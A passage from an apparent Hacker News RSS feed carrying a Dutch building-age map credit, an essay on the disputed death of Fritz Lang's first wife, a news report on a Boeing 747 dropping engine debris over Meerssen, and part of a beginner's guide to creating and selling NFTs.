		<p>2015</p>
		<p>2000</p>
		<p>1975</p>
		<p>1950</p>
		<p>1925</p>
		<p>1900</p>
		<p>1850</p>
		<p>1800</p>
		<p>1750</p>
		<p>1700 or earlier</p>
		<p>Not known</p>

		

		<p>Data: 3D BAG by 3D Geoinformation Group, TU Delft, January 2020: <a href="http://3dbag.bk.tudelft.nl/" target="_blank" rel="noopener">3dbag.bk.tudelft.nl</a></p>

		<!--<p>Thanks to inspiration from: <a href="http://code.waag.org/buildings/" target="_blank" rel="noopener">code.waag.org/buildings</a> and <a href="https://nieneb.nl/online-projects/gebouwen/" target="_blank" rel="noopener">nieneb.nl/online-projects/gebouwen</a>.</p>-->
		<p>Thanks to <a href="https://mapbox.com/" target="_blank">Mapbox</a> for their generous support in keeping this resource live.</p>
	</div></div>]]>
            </description>
            <link>https://parallel.co.uk/netherlands/#13.8/52.365/4.9/0/40</link>
            <guid isPermaLink="false">hacker-news-small-sites-26209951</guid>
            <pubDate>Sun, 21 Feb 2021 01:26:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Mysterious Death of Lisa Rosenthal (2012)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26209754">thread link</a>) | @mellosouls
<br/>
February 20, 2021 | http://www.williamahearn.com/lisa.html | <a href="https://web.archive.org/web/*/http://www.williamahearn.com/lisa.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><strong>Time has washed up more than some lost films</strong> as regards the life of Fritz Lang. Recent research has cast a new light on Lang’s first marriage and while the private lives of screen personalities rarely interest me, in this case it has already affected how his films are being viewed by at least by one recent biographer. The events concerning his first wife occurred either in the post-production of “Das wandernde Bild” or “Vier um die Frau” or the pre-production of “Der müde Tod,” although even that is a guess.</p><p><strong>Lang’s first wife was named Lisa Rosenthal</strong> although no source is absolutely positive about that and she is described – in some accounts – as a “Russian from Vilnius.” Little else is known about her and it is not her life that is fascinating as much as it is her death. One reference that I found was in Robert A. Armour’s <em>Fritz Lang</em>, published by Twayne Publishers in 1977. Armour wrote, “[Fritz] Lang divorced his first wife and married [Thea] von Harbou.”</p><p><strong>Lang didn’t divorce Lisa Rosenthal.</strong> Rosenthal died of a gunshot wound to the chest and therein hangs a tale that Lang left behind when he fled from Germany in 1933. The story is told in Patrick McGilligan’s <em>Fritz Lang: The Nature of the Beast </em>and the recap goes something like this: Thea von Harbou was married to actor Rudolf Klien-Rogge and when her affair with Lang – that was no secret to the film community – heated up, she moved out of her home with Klien-Rogge and moved into the same apartment building as Fritz Lang. One day Lisa Rosenthal comes home unexpectedly and finds Lang and Harbou engaged in “violent petting,” as Lang described it later, on the sofa. Shortly thereafter, Rosenthal is found dead in the bathtub from a gunshot to the chest delivered by Lang’s WWI sidearm that he kept as a memento. Phone calls were made but it wasn’t the police that were called immediately and suspicions flew. Harbou and Lang swore that Rosenthal shot herself and there was little the police could do and Lang and Harbou were charged with denial of assistance although that charge was soon dropped.&nbsp;</p><div id="Layer4">
    <p><strong>Suspicion fell on Lang that he had shot Lisa Rosenthal</strong> and émigrés brought that story to Hollywood years later although only in hushed tones and never when Lang was within earshot. No one has ever suggested that Thea von Harbou was in any way involved although obviously, if Lang killed his wife, von Harbou was some sort of accomplice even if only after-the-fact. What’s interesting in all of this is that so little is known about von Harbou. </p>
    <p><strong>There is talk that after “Der müde Tod”</strong> was finished Lang was committed to an insane asylum for a brief stay. Lang would mention in interviews that he visited insane asylums as a part of his research. The truth is lost to time. At this point all that remains is stories and gossip. Patrick McGilligan wrote, “No record of an inquest – no record, even, of Lisa Rosenthal’s death – could be found in the course of research for [<em>Fritz Lang: The Nature of the Beast</em>].” Studio executives – including Erich Pommer – showed up at the scene and much like Hollywood moguls they influenced and cajoled the police to protect their star. </p>
    <p><strong>Frederick Ott in <em>The Films of Fritz Lang</em></strong> describes the death of the unnamed Frau Lang as an “apparent” suicide. Lotte Eisner in <em>Fritz Lang </em>states that Lang’s wife “committed suicide” and wrote in her biography <em>Ich hatte einst ein schones Vaterland: Memoiren</em>, published in 1984 and never translated into English: “[Lisa Rosenthal] then went into the bedroom [sic] and shot herself.” </p>
    <p><strong>McGilligan states: “Perhaps suicide</strong> was such a familiar condition in his mind that it leapt to Fritz Lang’s tongue unbidden when the police arrived at his apartment on that fateful day, asking him to explain the inexplicable.” McGilligan bases this assumption on the content of Lang’s work stating that: “From the first film to the last, guilt, complicity, false accusation, irredeemable crime, inadvertent killings, and suicide haunt Lang’s work.” All of that is true except for the “guilt” and McGilligan seems to skip over the murders in Lang’s films. What “leapt to Fritz Lang’s tongue” implies that something else had occurred and there is only one other possibility. McGilligan then writes: “After the death of Lisa Rosenthal, the litany [of suicides in Lang’s films] is compelling.” McGilligan then lists the suicides in Lang’s films and describes them as “unmistakable thematic statements.” </p>
    <p><strong>According to one study of Weimar films,</strong> the three major themes in the top 25% of the films were guilt [about starting WWI], generational issues and suicide. Suicide was common in the films of Weimar as it would be later in films in France and Asia. It began to wane in the years of the Hays Code in the United States.</p>
    <p><strong>To attempt to solve whether Lisa Rosenthal’s death</strong> was murder or suicide by the content of the films Fritz Lang made after the event – especially the Hollywood films where Lang rarely had influence over the script – doesn’t make for a compelling case. Especially since a list of murders in Lang’s films would run even longer than a list of suicides. </p>
    <p><strong>Then again, a pistol being</strong> within grasping range shows up in Lang’s films quite often. McGilligan has produced an excellent biography of Lang and presents research that helps to understand the times that Lang lived. Where the author isn’t as impressive is in his understanding of the films and filmmaking as an art (eg, his description of the ending of “Spione” is inaccurate). There is no Hollywood ending to this story, no convenient set of symbols pointing to a resolution. There is only a dead woman with a gunshot chest wound bleeding in a bathtub and a lot of unanswered questions. That’s the end of the story. </p>
    <p><a href="http://www.williamahearn.com/thea.html">The Enigma of Thea von Harbou</a></p>
    
    
  </div></div>]]>
            </description>
            <link>http://www.williamahearn.com/lisa.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26209754</guid>
            <pubDate>Sun, 21 Feb 2021 00:55:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Boeing 747 loses parts after take-off from Maastricht – 2 injuries]]>
            </title>
            <description>
<![CDATA[
Score 106 | Comments 40 (<a href="https://news.ycombinator.com/item?id=26209611">thread link</a>) | @UncleOxidant
<br/>
February 20, 2021 | https://www.aviation24.be/airlines/longtail-aviation/boeing-747-loses-parts-after-take-off-from-maastricht-diverts-to-liege-two-people-injured/ | <a href="https://web.archive.org/web/*/https://www.aviation24.be/airlines/longtail-aviation/boeing-747-loses-parts-after-take-off-from-maastricht-diverts-to-liege-two-people-injured/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><strong><img loading="lazy" src="https://wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Longtail_accident.jpg" alt="" width="1920" height="1080" srcset="https://wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Longtail_accident.jpg 1920w, https://wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Longtail_accident-300x169.jpg 300w, https://wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Longtail_accident-1024x576.jpg 1024w, https://wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Longtail_accident-768x432.jpg 768w, https://wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Longtail_accident-1536x864.jpg 1536w, https://wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Longtail_accident-696x392.jpg 696w, https://wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Longtail_accident-1068x601.jpg 1068w, https://wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Longtail_accident-747x420.jpg 747w, https://wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Longtail_accident-600x338.jpg 600w" sizes="(max-width: 1920px) 100vw, 1920px">A Boeing 747-400BCF freighter registered VQ-BWT (MSN 24975) flying for Bermuda-based Longtail Aviation took off from runway 21 at Maastricht Aachen Airport this Saturday afternoon at 16:11 (UTC+1). The aeroplane operating flight LGT5504 to New York JFK experienced heavy damage on an engine shortly after take-off. Engine parts (turbine blades) fell in the nearby village of Meerssen resulting in 2 people slightly injured and damage to cars.</strong></p>
<p>According to a spokesman for the South Limburg Safety Region, an explosion has probably occurred in engine number one of the aircraft. Metal parts such as turbine blades have come down around the Limburg town of Meerssen.</p>
<p>Debris hit an elderly woman, who was slightly injured as a result. A child also burned his fingers on a piece of metal.</p>
<p>In Meerssen several houses and cars got damaged by falling debris.</p>
<p>The thirty-year-old plane immediately diverted on three engines to Liège airport, where it landed safely after making a number of laps over the Ardennes to burn fuel and lose weight.</p>
<p><img onload="Wpfcll.r(this,true);" src="https://wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/plugins/wp-fastest-cache-premium/pro/images/blank.gif" loading="lazy" data-wpfc-original-src="//wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Capture-1.jpg" alt="blank" width="1001" height="610" data-wpfc-original-srcset="//wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Capture-1.jpg 1001w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Capture-1-300x183.jpg 300w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Capture-1-768x468.jpg 768w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Capture-1-696x424.jpg 696w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Capture-1-689x420.jpg 689w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Capture-1-600x366.jpg 600w" sizes="(max-width: 1001px) 100vw, 1001px"></p>
<p>According to aviation expert Joris Melkert, it is a special incident: “<em>I cannot remember a recent case in the Netherlands where parts of an engine fell down.</em>”</p>
<p>The cause of the incident is unknown. The engine may have sucked up something causing the turbine blades to break. This is what the debris looks like, says the airport spokesman.</p>
<p>The police are calling on people to leave the debris behind, in connection with recording the damage.</p>
<p>The Onderzoeksraad voor Veiligheid (Dutch Safety Board) has started an exploratory investigation.</p>
<p>Spotter Aubrey Verbaere was present at Liège Airport when the Longtail Boeing 747 landed and provided <em>Aviation24.be</em> with the following pictures:</p>
<figure id="attachment_107911" aria-describedby="caption-attachment-107911"><img onload="Wpfcll.r(this,true);" src="https://wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/plugins/wp-fastest-cache-premium/pro/images/blank.gif" loading="lazy" data-wpfc-original-src="//wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613862657303-scaled.jpg" alt="blank" width="2048" height="1365" data-wpfc-original-srcset="//wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613862657303-scaled.jpg 2048w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613862657303-300x200.jpg 300w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613862657303-1024x683.jpg 1024w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613862657303-768x512.jpg 768w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613862657303-1536x1024.jpg 1536w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613862657303-696x464.jpg 696w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613862657303-1068x712.jpg 1068w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613862657303-1920x1280.jpg 1920w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613862657303-630x420.jpg 630w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613862657303-600x400.jpg 600w" sizes="(max-width: 2048px) 100vw, 2048px"><figcaption id="caption-attachment-107911">© Aubrey Verbaere</figcaption></figure>
<figure id="attachment_107912" aria-describedby="caption-attachment-107912"><img onload="Wpfcll.r(this,true);" src="https://wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/plugins/wp-fastest-cache-premium/pro/images/blank.gif" loading="lazy" data-wpfc-original-src="//wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856725643.jpg" alt="blank" width="1280" height="1280" data-wpfc-original-srcset="//wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856725643.jpg 1280w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856725643-300x300.jpg 300w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856725643-1024x1024.jpg 1024w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856725643-150x150.jpg 150w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856725643-768x768.jpg 768w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856725643-696x696.jpg 696w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856725643-1068x1068.jpg 1068w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856725643-420x420.jpg 420w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856725643-600x600.jpg 600w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856725643-100x100.jpg 100w" sizes="(max-width: 1280px) 100vw, 1280px"><figcaption id="caption-attachment-107912">© Aubrey Verbaere</figcaption></figure>
<figure id="attachment_107914" aria-describedby="caption-attachment-107914"><img onload="Wpfcll.r(this,true);" src="https://wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/plugins/wp-fastest-cache-premium/pro/images/blank.gif" loading="lazy" data-wpfc-original-src="//wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856725364.jpg" alt="blank" width="1280" height="1280" data-wpfc-original-srcset="//wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856725364.jpg 1280w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856725364-300x300.jpg 300w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856725364-1024x1024.jpg 1024w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856725364-150x150.jpg 150w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856725364-768x768.jpg 768w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856725364-696x696.jpg 696w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856725364-1068x1068.jpg 1068w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856725364-420x420.jpg 420w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856725364-600x600.jpg 600w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856725364-100x100.jpg 100w" sizes="(max-width: 1280px) 100vw, 1280px"><figcaption id="caption-attachment-107914">© Aubrey Verbaere</figcaption></figure>
<figure id="attachment_107906" aria-describedby="caption-attachment-107906"><img onload="Wpfcll.r(this,true);" src="https://wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/plugins/wp-fastest-cache-premium/pro/images/blank.gif" loading="lazy" data-wpfc-original-src="//wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856726231.jpg" alt="blank" width="1280" height="1280" data-wpfc-original-srcset="//wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856726231.jpg 1280w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856726231-300x300.jpg 300w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856726231-1024x1024.jpg 1024w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856726231-150x150.jpg 150w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856726231-768x768.jpg 768w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856726231-696x696.jpg 696w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856726231-1068x1068.jpg 1068w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856726231-420x420.jpg 420w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856726231-600x600.jpg 600w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613856726231-100x100.jpg 100w" sizes="(max-width: 1280px) 100vw, 1280px"><figcaption id="caption-attachment-107906">© Aubrey Verbaere</figcaption></figure>
<figure id="attachment_107909" aria-describedby="caption-attachment-107909"><img onload="Wpfcll.r(this,true);" src="https://wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/plugins/wp-fastest-cache-premium/pro/images/blank.gif" loading="lazy" data-wpfc-original-src="//wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613862659838-scaled.jpg" alt="blank" width="2048" height="1365" data-wpfc-original-srcset="//wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613862659838-scaled.jpg 2048w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613862659838-300x200.jpg 300w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613862659838-1024x683.jpg 1024w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613862659838-768x512.jpg 768w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613862659838-1536x1024.jpg 1536w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613862659838-696x464.jpg 696w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613862659838-1068x712.jpg 1068w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613862659838-1920x1280.jpg 1920w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613862659838-630x420.jpg 630w, //wwwaviation24be-q41r3jh.stackpathdns.com/wp-content/uploads/2021/02/Photo_1613862659838-600x400.jpg 600w" sizes="(max-width: 2048px) 100vw, 2048px"><figcaption id="caption-attachment-107909">© Aubrey Verbaere</figcaption></figure>
<p><b>Longtail Aviation</b> is a charter airline based in St. George’s, Bermuda and was formed in August 1999.</p>
<blockquote data-width="550" data-dnt="true">
<p lang="en" dir="ltr">Longtail Aviation cargo 747 loses engine parts over Meerssen after failure on departure from Maastricht Airport in The Netherlands. Aircraft landed safely in Liege. <a href="https://t.co/b22hB9QgKF">https://t.co/b22hB9QgKF</a> <a href="https://t.co/NYps5GoBzT">pic.twitter.com/NYps5GoBzT</a></p>
<p>— Breaking Aviation News &amp; Videos (@breakingavnews) <a href="https://twitter.com/breakingavnews/status/1363175798438510603?ref_src=twsrc%5Etfw">February 20, 2021</a></p></blockquote>

</div></div>]]>
            </description>
            <link>https://www.aviation24.be/airlines/longtail-aviation/boeing-747-loses-parts-after-take-off-from-maastricht-diverts-to-liege-two-people-injured/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26209611</guid>
            <pubDate>Sun, 21 Feb 2021 00:35:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A step by step guide to NFTs for creators]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26209575">thread link</a>) | @petergyang
<br/>
February 20, 2021 | https://creatoreconomy.so/p/guide-to-nfts-for-creators | <a href="https://web.archive.org/web/*/https://creatoreconomy.so/p/guide-to-nfts-for-creators">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Dear subscribers,</p><p>If you're a creator, the following numbers might catch your attention:</p><ul><li><p>A <a href="https://zora.co/void/500">digital flower</a> sold for $20,000</p></li><li><p>A&nbsp;<a href="https://superrare.co/artwork-v2/elephant-dreams-14316">looping video clip</a>&nbsp;sold for $26,128</p></li><li><p>A&nbsp;<a href="https://unisocks.exchange/">sock</a>&nbsp;sold for $60,000</p></li><li><p>A&nbsp;<a href="https://www.nbatopshot.com/listings/p2p/814c5183-596f-41d7-9135-c6b29faa9c6d+de32d3fb-0e6a-447e-b42a-08bbf1607b7d">Lebron James clip</a>&nbsp;sold for $99,999</p></li></ul><p>All of these items were sold as NFTs or non-fungible tokens.&nbsp;</p><p>In this post, I'll explain what NFTs are and walk through how you can create one to make more money from your content.</p><p><em>Thanks to <a href="https://twitter.com/NERFWRLD">Phil Murphy</a> from SuperRare for contributing to this post.</em></p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fea37e1fd-8184-40ec-95a7-81ed8900b130_1200x628.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fea37e1fd-8184-40ec-95a7-81ed8900b130_1200x628.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/ea37e1fd-8184-40ec-95a7-81ed8900b130_1200x628.png&quot;,&quot;height&quot;:628,&quot;width&quot;:1200,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:227465,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><h3><strong>What is an NFT?</strong></h3><p>A non-fungible token is a record that shows who owns a unique piece of content. Creators produce unique content such as images, videos, songs, and essays. An NFT is a record that says:</p><blockquote><p>Jenny owns the rights to this song (URL to song). She purchased it from Taylor (the original creator) on 12/31/2020 for $30,000.&nbsp;</p></blockquote><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ffdb167d6-55ff-4e5e-852b-42c37f54c49c_2416x1366.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ffdb167d6-55ff-4e5e-852b-42c37f54c49c_2416x1366.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/fdb167d6-55ff-4e5e-852b-42c37f54c49c_2416x1366.png&quot;,&quot;height&quot;:823,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:218549,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><h3><strong>I already own my content. Why do I need to make an NFT?</strong></h3><p>Do you really own your content?&nbsp;</p><p>Suppose you're Taylor, a talented musician. You upload a new song to Spotify and it gets 1 million plays (a hit!). Unfortunately:</p><ol><li><p><strong>Intermediaries take most of your earnings</strong>: Spotify only pays ~$4,000 for 1M plays. After other intermediaries (e.g., record label, management) take their cut, you're left with just $800.</p></li><li><p><strong>Intermediaries own your content rights</strong>: Like many new artists, you gave up your song's rights to the record label. Without your song’s rights, you can't even perform it live to fans without your label’s approval.</p></li><li><p><strong>Intermediaries control how many fans see your content</strong>: Spotify can change its discovery algorithms or even take down your content at any moment.</p></li></ol><p>Intermediaries help you create content, reach fans, and make money. But they also capture most of the value from your content. Even the real Taylor Swift had to <a href="https://twitter.com/taylorswift13/status/1359854050544615425">re-record her songs</a> to own her music.</p><h3><strong>I don’t want intermediaries to take my money. <br>How can NFTs help?</strong></h3><p>Suppose you're Taylor again, but this time, you create an NFT for your song that says:</p><blockquote><p>Taylor created this song on 12/1/2020 (URL to song). She’s selling its ownership to fans for $30,000. Each time fans resell Taylor’s song, she gets 10% of the sale price.</p></blockquote><p>A fan buys your NFT for $30,000. The marketplace takes 15%, so you earn 85% or $25,500. After a month, she resells it to another fan for $40,000 (you make 10% or $4,000 in royalties). Instead of only making $800, you've made $29,500 from just two transactions.</p><h3><strong>Why would fans spend money to own my content? Anyone can copy it online for free.</strong></h3><p>According to my (non-scientific) poll, most people buy NFTs to make money:</p><p>In the&nbsp;<a href="https://creatoreconomy.so/p/the-super-fan-flywheel">super fan flywheel</a>, we defined a super fan as someone who&nbsp;<strong>spends money</strong>&nbsp;to have authentic interactions with the creator. NFTs make it possible for super fans to&nbsp;<strong>make money</strong>&nbsp;by owning content that can appreciate in value with the creator.</p><p>Suppose you paid $30,000 to buy an NFT from an unknown artist. If that artist became famous a year later, you can sell the same NFT at a much higher price.&nbsp;</p><p>Like stocks, NFTs let fans make a bet on the creator’s potential.</p><h3><strong>So only a creator’s super fans are buying their NFTs? </strong></h3><p>Not at all. I think some buyers could care less about the creator and just want to make a quick profit. For example, someone bought&nbsp;<a href="https://app.rarible.com/token/0x60f80121c31a0d46b5279700f9df786054aa5ee5:124196:0x3781d92e5449b5b689fee308ded44882085b6312">Lindsay Lohan's art NFT</a>&nbsp;for $17K and immediately put it back on the market for $78K. </p><p>NFT trading volume is entering the frenzy stage, and many people want to ride the market to higher profits:</p><p>But speculation isn't always a bad thing. Long term, speculation leads to more interest from entrepreneurs and builders in this space.</p><h3><strong>Ok I’m interested, how do I create an NFT for my content?</strong></h3><p>Here's a step by step guide:</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fc091ff13-c340-4c9d-8e67-57aee5b8972e_2416x1366.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fc091ff13-c340-4c9d-8e67-57aee5b8972e_2416x1366.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/c091ff13-c340-4c9d-8e67-57aee5b8972e_2416x1366.png&quot;,&quot;height&quot;:823,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:235661,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><h4><strong>1. Select the content</strong></h4><p>The most popular NFT category is digital art (typically a PNG, GIF, audio clip, or video clip). However, creators have also made NFTs for everything from domain names to virtual gaming items.&nbsp;<br></p><h4><strong>2. Choose an NFT marketplace</strong></h4><p>There are two types of marketplaces:</p><ol><li><p><strong>Self-service platforms</strong>&nbsp;(e.g., <a href="https://rarible.com/">Rarible</a>, <a href="https://opensea.io/">OpenSea</a>) let anyone create an NFT. You just need to upload your photo, audio, or video file and fill in what percent royalty you want to charge for each sale. The downside is that these marketplaces often have copycats and fakes.</p></li><li><p><strong>Curated platforms</strong>&nbsp;(e.g., <a href="https://superrare.co/">SuperRare</a>, <a href="https://foundation.app/">Foundation</a>) only let approved creators mint NFTs. These platforms usually focus on NFTs for high-quality digital art vs. simple collectibles. The downsides are higher transaction fees (15% vs. 3%) and less flexibility in your royalty percentage (typically 10%).<br></p></li></ol><h4><strong>3. Pay from your crypto wallet</strong></h4><p>I purposefully did not bring up ethereum or blockchain until now. As a creator, all you need to know is that you creating an NFT costs you ether (a cryptocurrency like bitcoin). You can purchase ether from a digital wallet like&nbsp;<a href="https://metamask.io/">Metamask</a>.</p><p>Now here's the big catch with NFTs (at least for now). Due to limitations with the ethereum blockchain, it costs the ether equivalent of ~$70-100 USD to create an NFT. So if you want to make a profit, your NFTs typically need to sell for over $100.<br></p><h4><strong>4. Promote on social</strong></h4><p>Just like with your content, you need to promote your NFT to fans on social to help them discover it.</p><h3><strong>How many NFTs can I release?</strong></h3><p>Most platforms allow you to create an unlimited number of NFTs. However, you should think through how many editions of the same NFT you want to issue:</p><ul><li><p><strong>1-of-1</strong>. You only issue one copy of the NFT, which makes it more valuable. Think Mona Lisa - there are many copies of the painting, but there is only one original piece hanging in Louvre.</p></li><li><p><strong>Edition</strong>. You issue many copies of the same NFT. Think of it like releasing a merch drop where you have a limited amount of the same hoodie to create scarcity and hype.</p></li></ul><h3><strong>This sounds really good, but what are the risks?</strong></h3><p>If you 